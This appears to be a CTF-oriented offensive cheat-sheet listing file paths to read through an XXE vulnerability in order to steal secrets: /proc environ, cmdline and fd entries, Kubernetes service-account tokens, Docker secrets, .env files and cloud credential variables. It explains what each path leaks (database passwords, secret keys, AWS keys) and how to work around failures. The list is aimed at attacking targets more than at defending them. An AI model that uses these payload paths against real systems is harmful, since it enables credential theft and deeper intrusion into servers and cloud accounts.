# Env / Secret Read — `/proc` + config secrets through XXE

## `/proc/self/environ` — the process env

```
file:///proc/self/environ
```

NUL-separated `KEY=value\0` pairs — the env of the process running the
parser — which is usually the WEB SERVER process, not a shell — but
still carries `FLAG`, `DB_PASS`, `SECRET_KEY`, `PATH`, etc.

NUL bytes — the entity value contains literal `\x00` — most parsers
handle it, the echo may truncate at the first NUL — split reads or
base64-wrap if PHP.

## The `/proc/1/environ` variant — PID 1's env

```
file:///proc/1/environ
```

PID 1 = the container entrypoint — often `docker-entrypoint`/`supervisord`
— its env is the CONTAINER env — `FLAG` is set here when the challenge
injects it via `docker run -e FLAG=...`.

## `/proc/self/cmdline` — the launch command

```
file:///proc/self/cmdline
```

`php-fpm\0--fpm-config\0/etc/php/fpm.conf\0` — the args reveal config
paths to read next.

## `/proc/self/cwd/` — the working-dir escape

```
file:///proc/self/cwd              — the working dir itself
file:///proc/self/cwd/../config    — relative to it
file:///proc/self/cwd/../../flag   — traversal — is a SYMLINK read
```

`cwd` is a symlink — reading it follows the link — the "read relative
to the app's cwd" trick.

## `/proc/self/fd/N` — the open-handle read

```
file:///proc/self/fd/0
file:///proc/self/fd/1
file:///proc/self/fd/3
```

fds 0/1/2 = stdio; 3+ = the app's open files — a deleted-but-open file,
an open log, an open socket (reading a socket hangs — avoid), an open
flag file. Try fd 3–20.

## `/proc/self/status` — the identity leak

```
Uid:  33  33  33  33       — www-data
Gid:  33  33  33  33
```

Tells you the parser's user — `Uid:0` = root-read possible → `/etc/shadow`,
`/root/flag` reachable.

## `/proc/net/tcp` — the internal-services map

```
local_address   rem_address   st
0100007F:1F90   00000000:0000 0A   — 127.0.0.1:8080 listening
```

Hex-encoded `IP:port` — `0A` = LISTEN — the map of internal services to
SSRF — `ssrf-via-xxe.md`.

## The k8s/docker secret paths

```
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/<name>            — docker secrets
/run/secrets/db_password
```

## The cloud-metadata adjacency — env → metadata

`/proc/self/environ` reveals cloud creds — `AWS_ACCESS_KEY_ID`,
`AWS_SECRET_ACCESS_KEY`, `GOOGLE_APPLICATION_CREDENTIALS`,
`AZURE_*` — those are the keys; the metadata endpoint `http://169.254.
169.254/` is the SSRF-side — `ssrf-via-xxe.md`.

## The ".env-file-in-the-repo" — the common one

```
file:///var/www/html/.env
file:///app/.env
file:///opt/app/.env
file:///var/www/.env
```

`.env` carries `APP_KEY`/`DB_PASSWORD`/`SECRET`/`FLAG` — the first
secret file to try after `/proc/self/environ`.

## Reading secrets the app loads lazily

A `config.yml` the app loads at startup is already in memory — the
FILE still exists on disk — `file:///app/config.yml` reads it — the
"the app cached it" is irrelevant to XXE's disk-read.

## Falsifiers

- `/proc` unavailable (no procfs, BSD, Windows) → the env paths die;
  fall to `file:`-config reads or platform-specific paths
- the parser isn't the web process (a worker) → `/proc/self` is the
  WORKER — may lack `FLAG` — try `/proc/1/environ` for the container env
